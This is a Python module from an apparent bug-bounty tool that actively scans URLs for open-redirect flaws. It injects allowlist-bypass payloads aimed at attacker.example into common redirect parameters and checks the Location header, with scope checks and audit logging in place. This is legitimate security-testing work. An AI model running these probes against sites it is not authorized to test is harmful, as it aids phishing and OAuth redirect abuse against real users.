"""Active open-redirect probe.

A target is vulnerable when an attacker-controlled value supplied via
a redirect-style parameter is reflected into the response ``Location``
header. We test the canonical parameter names (``url``, ``next``,
``redirect``, ``return``, ``returnTo``, ``return_to``, ``redirect_uri``,
``redirectUrl``, ``continue``, ``dest``) against a panel of payloads
that defeat naive allowlists:

* ``https://attacker.example``
* ``//attacker.example`` (protocol-relative)
* ``\\\\attacker.example`` (Windows-style backslash bypass)
* ``https:attacker.example`` (no slashes; some libs accept)
* ``https://target.example.attacker.example`` (suffix bypass)
* ``//attacker.example/.target.example`` (path-as-host)

For each (param, payload) pair we send a single GET with the URL
under test and inspect the response. A redirect (3xx) whose Location
points to ``attacker.example`` is the finding.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import httpx

from bounty_agent.core import Finding, FindingSource, ScopePolicy, Severity
from bounty_agent.logging_setup import audit, get_logger

logger = get_logger(__name__)


_REDIRECT_PARAM_NAMES: tuple[str, ...] = (
    "url",
    "next",
    "redirect",
    "return",
    "returnTo",
    "return_to",
    "redirect_uri",
    "redirectUrl",
    "redirect_url",
    "continue",
    "dest",
    "destination",
    "to",
    "u",
)

_ATTACKER_HOST = "attacker.example"
_REDIRECT_MIN = 300
_REDIRECT_MAX = 400


@dataclass(frozen=True)
class _RedirectPayload:
    """One payload + the literal substring we expect in the Location
    header on a successful bypass."""

    payload: str
    expect_in_location: str
    name: str


def _payloads_for_target(target_host: str) -> tuple[_RedirectPayload, ...]:
    return (
        _RedirectPayload(
            payload=f"https://{_ATTACKER_HOST}",
            expect_in_location=_ATTACKER_HOST,
            name="absolute_url",
        ),
        _RedirectPayload(
            payload=f"//{_ATTACKER_HOST}",
            expect_in_location=_ATTACKER_HOST,
            name="protocol_relative",
        ),
        _RedirectPayload(
            payload=f"\\\\{_ATTACKER_HOST}",
            expect_in_location=_ATTACKER_HOST,
            name="backslash_bypass",
        ),
        _RedirectPayload(
            payload=f"https:{_ATTACKER_HOST}",
            expect_in_location=_ATTACKER_HOST,
            name="no_slash_bypass",
        ),
        _RedirectPayload(
            payload=f"https://{target_host}.{_ATTACKER_HOST}",
            expect_in_location=_ATTACKER_HOST,
            name="suffix_bypass",
        ),
        _RedirectPayload(
            payload=f"//{_ATTACKER_HOST}/.{target_host}",
            expect_in_location=_ATTACKER_HOST,
            name="path_as_host",
        ),
    )


class OpenRedirectScanner:
    """Test every URL with every (param, payload) pair."""

    def __init__(
        self,
        scope: ScopePolicy | None = None,
        request_timeout_seconds: float = 10.0,
        candidate_params: tuple[str, ...] = _REDIRECT_PARAM_NAMES,
    ) -> None:
        self.scope = scope
        self.request_timeout_seconds = request_timeout_seconds
        self.candidate_params = candidate_params

    async def scan(self, client: httpx.AsyncClient, urls: list[str]) -> list[Finding]:
        if not urls:
            return []
        audit("open_redirect.scan_started", urls=len(urls))
        coros = [self._scan_one(client, url) for url in urls]
        results = await asyncio.gather(*coros, return_exceptions=True)
        findings: list[Finding] = []
        for outcome in results:
            if isinstance(outcome, BaseException):
                logger.info("open_redirect.scan_failed", error=str(outcome))
                continue
            findings.extend(outcome)
        audit(
            "open_redirect.scan_finished",
            urls=len(urls),
            findings=len(findings),
        )
        return findings

    async def _scan_one(self, client: httpx.AsyncClient, url: str) -> list[Finding]:
        if self.scope is not None:
            self.scope.check(url)
        parsed = urlparse(url)
        host = parsed.hostname or url
        # Discover which params to test: if the URL already has a
        # redirect-looking param, fuzz only that one (high precision).
        # Otherwise try every candidate (lower precision, broader
        # coverage).
        existing = {name for name, _ in parse_qsl(parsed.query, keep_blank_values=True)}
        params_to_test: tuple[str, ...]
        existing_redirect = existing.intersection(self.candidate_params)
        params_to_test = tuple(existing_redirect) if existing_redirect else self.candidate_params

        findings: list[Finding] = []
        for param_name in params_to_test:
            for payload in _payloads_for_target(host):
                test_url = _inject_query_param(url, param_name, payload.payload)
                try:
                    response = await client.get(
                        test_url,
                        timeout=self.request_timeout_seconds,
                        follow_redirects=False,
                    )
                except (httpx.HTTPError, httpx.InvalidURL):
                    # InvalidURL fires when the server returns a Location
                    # header that doesn't parse as a URL (e.g. a malformed
                    # bypass payload echoed back). Skip and continue.
                    continue
                if not (_REDIRECT_MIN <= response.status_code < _REDIRECT_MAX):
                    continue
                location = response.headers.get("location", "")
                if payload.expect_in_location not in location:
                    continue
                findings.append(
                    Finding(
                        url=test_url,  # type: ignore[arg-type]
                        source=FindingSource.MANUAL,
                        severity=Severity.MEDIUM,
                        title=f"Open redirect via '{param_name}' ({payload.name})",
                        description=(
                            "The server returned a 3xx Location header that "
                            "points to an attacker-controlled host. An "
                            "attacker can use this to send victims through "
                            "the target's domain (phishing trust transfer) "
                            "and to break OAuth / SSO redirect_uri checks."
                        ),
                        payload=payload.payload,
                        evidence={
                            "param": param_name,
                            "payload_variant": payload.name,
                            "status_code": response.status_code,
                            "location_header": location[:300],
                            "tool": "open-redirect",
                        },
                    )
                )
        return findings


def _inject_query_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    query = dict(parse_qsl(parsed.query, keep_blank_values=True))
    query[name] = value
    new_query = urlencode(query, safe=":/")
    return urlunparse(parsed._replace(query=new_query))


__all__ = ["OpenRedirectScanner"]
